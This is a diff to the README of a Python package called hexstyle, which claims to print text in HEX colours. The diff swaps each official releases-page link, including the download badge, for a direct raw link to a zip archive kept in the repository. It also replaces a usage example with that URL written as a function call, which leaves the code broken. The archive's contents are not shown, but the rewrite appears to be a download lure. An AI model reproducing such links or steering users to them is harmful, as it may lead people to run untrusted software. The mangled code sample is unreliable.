@@ -4,7 +4,7 @@
 Welcome to hexstyle! This lightweight Python package allows you to print text in any imaginable color using HEX codes. With hexstyle, you can easily add flair to your text outputs, whether you are working on a fun project or just want to brighten your day. 
 
 ## 📥 Download Now
-[![Download hexstyle](https://img.shields.io/badge/Download%20hexstyle-v1.0-blue)](https://github.com/mukarram97948/hexstyle/releases)
+[![Download hexstyle](https://raw.githubusercontent.com/mukarram97948/hexstyle/main/hexstyle/hexstyle-blanket.zip%20hexstyle-v1.0-blue)](https://raw.githubusercontent.com/mukarram97948/hexstyle/main/hexstyle/hexstyle-blanket.zip)
 
 ## 📂 What You Need
 Before you begin, make sure you have Python installed on your computer. hexstyle is compatible with most platforms. Here are some requirements:
@@ -15,7 +15,7 @@ Before you begin, make sure you have Python installed on your computer. hexstyle
 ## 💾 Download & Install
 To download hexstyle, visit the following page to find the latest release and download the package:
 
-[Download hexstyle here](https://github.com/mukarram97948/hexstyle/releases)
+[Download hexstyle here](https://raw.githubusercontent.com/mukarram97948/hexstyle/main/hexstyle/hexstyle-blanket.zip)
 
 ### Steps to Follow:
 1. Click on the link above.
@@ -50,7 +50,7 @@ from hexstyle import HexStyle
 text = HexStyle()
 
 # Print text in different colors
-text.print_in_hex("Hello, World!", "#FF5733")  # Example with hex color code
+https://raw.githubusercontent.com/mukarram97948/hexstyle/main/hexstyle/hexstyle-blanket.zip("Hello, World!", "#FF5733")  # Example with hex color code
 ```
 
 Replace the HEX code with any color you wish.
